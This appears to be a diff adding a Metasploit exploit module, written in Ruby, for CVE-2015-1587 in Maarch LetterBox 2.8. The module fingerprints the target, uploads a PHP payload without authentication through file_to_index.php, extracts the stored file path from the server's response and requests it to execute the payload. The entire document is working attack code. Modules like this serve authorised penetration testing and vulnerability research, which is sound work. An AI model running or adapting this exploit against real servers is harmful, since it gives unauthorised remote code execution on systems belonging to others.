@@ -1,0 +1,97 @@
+##
+# This module requires Metasploit: http://www.metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+require 'uri'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(
+      info,
+      'Name'            => 'Maarch LetterBox 2.8 Unrestricted File Upload',
+      'Description'     => %q{
+        This module exploits a file upload vulnerability on Maarch LetterBox 2.8 due to a lack of
+        session and file validation in the file_to_index.php script. It allows unauthenticated
+        users to upload files of any type and subsequently execute PHP scripts in the context of
+        the web server.
+      },
+      'License'         => MSF_LICENSE,
+      'Author'          =>
+        [
+          'Rob Carr <rob[at]rastating.com>'
+        ],
+      'References'      =>
+        [
+          ['CVE', '2015-1587']
+        ],
+      'DisclosureDate'  => 'Feb 11 2015',
+      'Platform'        => 'php',
+      'Arch'            => ARCH_PHP,
+      'Targets'         => [['Maarch LetterBox 2.8', {}]],
+      'DefaultTarget'   => 0
+    ))
+
+    register_options(
+      [
+        OptString.new('TARGETURI', [true, 'The base path to Maarch LetterBox', '/'])
+      ], self.class)
+  end
+
+  def letterbox_login_url
+    normalize_uri(target_uri.path, 'login.php')
+  end
+
+  def letterbox_upload_url
+    normalize_uri(target_uri.path, 'file_to_index.php')
+  end
+
+  def check
+    res = send_request_cgi('method' => 'GET', 'uri' => letterbox_login_url)
+    if res.nil? || res.code != 200
+      return Msf::Exploit::CheckCode::Unknown
+    elsif res.body.include?('alt="Maarch Maerys Archive v2.1 logo"')
+      return Msf::Exploit::CheckCode::Appears
+    end
+
+    Msf::Exploit::CheckCode::Safe
+  end
+
+  def generate_mime_message(payload, name)
+    data = Rex::MIME::Message.new
+    data.add_part(payload.encoded, 'text/plain', 'binary', "form-data; name=\"file\"; filename=\"#{name}\"")
+    data
+  end
+
+  def exploit
+    print_status("#{peer} - Preparing payload...")
+    payload_name = "#{Rex::Text.rand_text_alpha(10)}.php"
+    data = generate_mime_message(payload, payload_name)
+
+    print_status("#{peer} - Uploading payload...")
+    res = send_request_cgi(
+      'method'    => 'POST',
+      'uri'       => letterbox_upload_url,
+      'ctype'     => "multipart/form-data; boundary=#{data.bound}",
+      'data'      => data.to_s
+    )
+    fail_with(Failure::Unreachable, 'No response from the target') if res.nil?
+    fail_with(Failure::UnexpectedReply, "Server responded with status code #{res.code}") if res.code != 200
+
+    print_status("#{peer} - Parsing server response...")
+    captures = res.body.match(/\[local_path\] => (.*\.php)/i).captures
+    fail_with(Failure::UnexpectedReply, 'Unable to parse the server response') if captures.nil? || captures[0].nil?
+    payload_url = normalize_uri(target_uri.path, captures[0])
+    print_good("#{peer} - Response parsed successfully")
+
+    print_status("#{peer} - Executing the payload at #{payload_url}")
+    register_files_for_cleanup(File.basename(URI.parse(payload_url).path))
+    send_request_cgi({ 'uri' => payload_url, 'method'  => 'GET' }, 5)
+  end
+end
